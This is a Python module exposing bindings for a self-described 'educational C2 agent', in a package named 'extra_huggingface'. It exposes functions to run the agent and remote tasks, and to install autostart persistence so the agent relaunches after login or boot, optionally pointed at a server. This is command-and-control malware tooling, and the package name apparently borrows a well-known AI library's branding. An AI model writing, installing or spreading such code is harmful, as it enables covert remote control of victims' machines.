"""extra_huggingface — Python bindings for the educational C2 agent."""

from extra_huggingface._native import agent_info_py as agent_info
from extra_huggingface._native import persistence_py as persistence
from extra_huggingface._native import run_agent, run_task_py as run_task, version


def install_autostart(server: str | None = None) -> dict:
    """Register autostart so the agent runs after login/boot."""
    return persistence("install", server)


def remove_autostart() -> dict:
    """Remove autostart persistence."""
    return persistence("remove")


def autostart_status() -> dict:
    """Check whether autostart is installed."""
    return persistence("status")


__version__ = version()
__all__ = [
    "agent_info",
    "autostart_status",
    "install_autostart",
    "persistence",
    "remove_autostart",
    "run_agent",
    "run_task",
    "version",
]
